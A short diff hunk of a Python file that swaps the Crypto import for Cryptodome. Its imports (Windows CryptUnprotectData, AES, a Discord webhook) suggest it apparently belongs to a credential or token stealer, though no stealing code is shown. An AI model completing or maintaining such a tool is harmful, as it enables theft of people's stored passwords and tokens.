@@ -4,7 +4,7 @@ import os
 import re
 
 import requests
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from discord import Embed, SyncWebhook
 from win32crypt import CryptUnprotectData
 
